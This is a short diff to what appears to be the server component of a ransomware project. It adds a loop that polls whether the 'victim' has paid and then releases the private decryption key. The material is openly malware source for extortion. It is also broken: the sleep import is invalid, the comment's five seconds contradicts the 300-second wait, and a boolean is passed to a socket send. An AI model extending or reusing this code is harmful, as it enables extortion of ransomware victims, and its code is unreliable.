@@ -14,6 +14,7 @@ import time
 from getmac import get_mac_address
 import cryptowallet
 import rsa
+import sleep
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -176,7 +177,12 @@ class Server:
 
                     
                 while (True):
-                    if(self.check_if_user_paid()):
+                    #Every 5 seconds check if victim paid, if they did send them a message
+                    sleep(300)
+                    paid = self.check_if_user_paid()
+                    
+                    if(paid):
+                        connection.sendall(paid)
                         # sends decryption key  
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
